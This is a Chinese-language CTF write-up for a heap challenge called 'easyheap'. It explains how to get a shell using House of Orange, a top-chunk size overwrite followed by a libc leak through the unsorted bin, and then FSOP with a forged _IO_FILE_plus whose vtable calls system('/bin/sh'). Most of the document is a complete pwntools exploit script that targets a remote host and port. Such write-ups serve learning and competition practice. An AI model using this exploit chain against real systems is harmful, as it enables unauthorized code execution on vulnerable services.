观察代码 可以发现没有 可以free堆块的函数 ， 于是考虑可以使用houseOforange可以利用堆溢出修改下一chunk的size,从而是堆块分配值unsortbin，然后利用uaf漏洞进行泄露

完成泄露后可以使用FSOP，通过伪造的 vtable 和_IO_FILE_plus,从而通过报错来劫持程序流

1.首先通过gift函数接收地址。在通过溢出修改size，从而使得topchunk的size为0xf81 。 这里需要自行调试使得该chunk对齐

2.再次malloc一个大堆块，使得topchunk进入unsortbin,再次切割该堆块，通过show函数泄露地址。

3.伪造vtable 和_IO_FILE_plus

    fake_file = b'/bin/sh\x00'+p64(0x61)
    fake_file += p64(0)+p64(io_list_all-0x10)
    fake_file += p64(0) + p64(1)
    fake_file = fake_file.ljust(0xc0,b'\x00')
    fake_file += p64(0) * 3
    fake_file += p64(heap+0x1198) #vtable ptr
    fake_file += p64(0) * 2
    fake_file += p64(system)
    payload += fake_file

进入报错函数后将会进入system并以/bin/sh为参数，这注意#vtable ptr需要自行调试使其指向自身。

4.再次执行malloc即可getshell
```
	#!/usr/bin/env python3
	#-*- coding:utf-8 -*-
	from pwn import *
	import os
	r   =  lambda x : io.recv(x)
	ra  =  lambda   : io.recvall()
	rl  =  lambda   : io.recvline(keepends = True)
	ru  =  lambda x : io.recvuntil(x, drop = True)
	s   =  lambda x : io.send(x)
	sl  =  lambda x : io.sendline(x)
	sa  =  lambda x, y : io.sendafter(x, y)
	sla =  lambda x, y : io.sendlineafter(x, y)
	ia  =  lambda : io.interactive()
	c   =  lambda : io.close()
	li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
	context.log_level='debug'
	#elf = ELF('./EZheap')
	elf = ELF('./easyheap')
	libc = ELF("./libc.so.6")
	#io = elf.process()
	io = remote("101.35.18.209",20101)
	#io = remote("47.108.195.119",20141)


​	
	def ad(sz,na):
	    sla('away\n', '1')
	    sla('size of it', str(sz))
	    sla('Name?', na)
	
	def md(sz, na):
	    sla('away\n', '2')
	    sla('size of it', str(sz))
	    sla('name', na)
	
	def dp():
	    sla('away\n', '3')


​	
​	
	def finish():
	    ia()
	    c()
	
	def exploit():
	    li('exploit...')
	#--------------------------------
	#    io.recvuntil("名称:")
	#    io.sendline("")
	#    io.recvuntil("名字:")
	#    io.sendline("")
	#--------------------------------
	
	    heap = io.recvuntil(b'\n',drop=True).ljust(8, b'\x00')
	    heap = int(heap,16)
	    print("heap",hex(heap))
	
	    ad(0x20,"aaaa")
	    ad(0xbd0+0x420,"aaaa")
	    ad(0x20,"bbbb")
	    md(0x40,b"A"*0x20 + p64(0) +p64(0xf81))
	    #gdb.attach(io)
	    ad(0x1000,"AAAA")
	    ad(0x40,"BBBBBBBB")
	    dp() 
	    
	    io.recvuntil("BBBBBBBB")
	    area = u64(io.recvuntil(b'\x7f').ljust(8, b'\x00')) - 1514
	    malloc = area  - 0x10
	    libc_base = malloc - libc.sym['__malloc_hook']
	    io_list_all = libc_base + libc.symbols['_IO_list_all']
	    system = libc_base + libc.symbols['system']
	    print("area             ",hex(area))
	    print("malloc           ",hex(malloc))
	    print("io_list_all      ",hex(io_list_all))
	    print("system           ",hex(system))
	    print("heap",hex(heap))
	    #gdb.attach(io)
	    payload = b'a' * 0x40
	    fake_file = b'/bin/sh\x00'+p64(0x61)#to small bin
	    fake_file += p64(0)+p64(io_list_all-0x10)
	    fake_file += p64(0) + p64(1)#_IO_write_base < _IO_write_ptr
	    fake_file = fake_file.ljust(0xc0,b'\x00')
	    fake_file += p64(0) * 3
	    fake_file += p64(heap+0x1198) #vtable ptr
	    fake_file += p64(0) * 2
	    fake_file += p64(system)
	    payload += fake_file
	
	    md(len(payload),payload)
	    #gdb.attach(io)
	    io.recvuntil("away\n")
	    io.sendline('1')
	
	#    gdb.attach(io)  
	   
	#-------------------------------start
	
	if __name__ == '__main__':
	    exploit()
	    finish()
	```